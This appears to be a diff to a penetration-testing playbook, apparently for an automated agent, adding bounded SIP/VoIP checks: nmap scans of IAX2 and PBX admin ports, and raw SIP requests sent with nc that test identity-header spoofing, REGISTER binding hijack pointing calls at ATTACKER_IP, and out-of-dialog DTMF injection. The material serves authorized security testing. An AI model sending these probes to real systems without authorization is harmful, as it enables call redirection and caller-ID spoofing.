@@ -127,6 +127,36 @@ awk '/^(OPTIONS|REGISTER|INVITE|SUBSCRIBE|SIP\/2.0|User-Agent:|Server:|Warning:|
 
 A finding needs a reproducible request/response pair and a stated impact: unauthenticated call routing, account takeover, cleartext signaling, or media eavesdropping. Enumeration alone is not account takeover.
 
+### 9. Adjacent VoIP Surfaces (bounded, within the same message budget)
+
+Check for related protocols and admin surfaces that often share infrastructure with SIP but are commonly missed:
+
+```bash
+timeout 60s run_tool nmap -sU -p 4569 --script iax2-version HOST > "$DIR/scans/sip_iax2.txt" 2>&1 # Asterisk IAX2 trunking, if present
+run_tool nmap -p 80,443,8088,8089 --script http-title HOST > "$DIR/scans/sip_pbx_web.txt" 2>&1 # paired PBX web admin (FreePBX, 3CX, Asterisk ARI)
+```
+
+- [ ] **IAX2 (4569/udp)** — Asterisk trunking protocol; version disclosure and default-credential trunk registration are the same class of finding as SIP REGISTER, count toward the same message budget if probed
+- [ ] **Paired PBX web admin** — FreePBX/3CX/Asterisk-ARI consoles often sit on an adjacent HTTP(S) port on the same host; a default-credential web login there is frequently a faster path to full call-control than SIP enumeration — hand off to `web-admin-console-testing` rather than re-deriving it here
+- [ ] **Voicemail PIN weakness** — do NOT brute-force live; only note if a discovered account's voicemail box is reachable and whether the system enforces a minimum PIN length/lockout, from a single non-destructive OPTIONS/SUBSCRIBE-derived observation
+- [ ] **SIP-over-WebSocket (WSS) signaling** for WebRTC softphones — check `wss://HOST/ws` or similar paths surfaced by source-analyzer on the paired web app; treat as SIP transport, same safety rules apply
+
+### 10. Identity Trust and Header-Injection Checks (bounded, within the same message budget)
+
+Test whether the server trusts client-asserted identity/trust headers rather than deriving them from authenticated state, and whether REGISTER binding overwrite is possible without re-authentication.
+
+```bash
+printf '%s\r\n' 'INVITE sip:user@HOST SIP/2.0' 'Via: SIP/2.0/UDP HOST:PORT;branch=z9hG4bK-pai' 'From: <sip:user@HOST>;tag=probe' 'To: <sip:user@HOST>' 'P-Asserted-Identity: <sip:admin@HOST>' 'Call-ID: pai-spoof@HOST' 'CSeq: 1 INVITE' 'Max-Forwards: 0' 'Content-Length: 0' '' '' | timeout 10s run_tool nc -u -w 5 HOST PORT > "$DIR/scans/sip_pai_spoof.txt" 2>&1 # identity header
+printf '%s\r\n' 'REGISTER sip:user@HOST SIP/2.0' 'Via: SIP/2.0/UDP HOST:PORT;branch=z9hG4bK-hijack' 'From: <sip:user@HOST>;tag=hijack-1' 'To: <sip:user@HOST>' 'Call-ID: register-1@HOST' 'CSeq: 2 REGISTER' 'Contact: <sip:attacker@ATTACKER_IP:PORT;transport=udp>' 'Expires: 60' 'Max-Forwards: 0' 'Content-Length: 0' '' '' | timeout 10s run_tool nc -u -w 5 HOST PORT > "$DIR/scans/sip_register_hijack.txt" 2>&1 # same Call-ID, no auth
+printf '%s\r\n' 'INFO sip:user@HOST SIP/2.0' 'Via: SIP/2.0/UDP HOST:PORT;branch=z9hG4bK-dtmf' 'From: <sip:user@HOST>;tag=probe' 'To: <sip:user@HOST>' 'Call-ID: dtmf-inject@HOST' 'CSeq: 1 INFO' 'Content-Type: application/dtmf-relay' 'Max-Forwards: 0' 'Content-Length: 20' '' 'Signal=5' 'Duration=250' | timeout 10s run_tool nc -u -w 5 HOST PORT > "$DIR/scans/sip_info_dtmf.txt" 2>&1 # out-of-dialog INFO
+awk '/^(SIP\/2.0|P-Asserted-Identity:|Remote-Party-ID:|Warning:|Reason:|Contact:)/' "$DIR/scans/sip_pai_spoof.txt" "$DIR/scans/sip_register_hijack.txt" "$DIR/scans/sip_info_dtmf.txt"
+```
+
+- **`P-Asserted-Identity`/`Remote-Party-ID` trust check** — the request uses the SAME `Call-ID` and unauthenticated context as the earlier bounded probes in this budget; a server that reflects or routes based on a client-supplied `P-Asserted-Identity` without stripping it at the trust boundary (it should only ever be set by a trusted upstream proxy) is an identity-spoofing finding for caller-ID/authorization decisions downstream.
+- **REGISTER binding overwrite without re-authentication** — send a second REGISTER reusing a `Call-ID` you have not authenticated for, with an attacker-controlled `Contact`; if the server accepts a lower/equal `CSeq`-ordered rebind or silently overwrites the existing binding, incoming calls for that user can be silently redirected. This is a distinct finding from the digest-nonce reuse already covered in step 3 — it targets binding-overwrite authorization, not nonce replay.
+- **Out-of-dialog SIP INFO / DTMF injection** — an INFO sent without an established dialog that the server nonetheless processes (rather than rejecting with `481 Call/Transaction Does Not Exist`) indicates the signaling stack does not enforce dialog state before acting on media-control messages; note as a call-control-integrity finding, do not chain into a live call.
+- Count all three probes toward the same 35-message/host budget in step 8; do not add a retry beyond the one probe per class.
+
 ## References
 
 `references/vuln-checklists/A02-security-misconfiguration.md`, `references/vuln-checklists/A04-cryptographic-failures.md`, `references/vuln-checklists/A07-authentication-failures.md`, `references/vuln-checklists/A10-exceptional-conditions.md`, `references/tools/recon/nmap.md`.
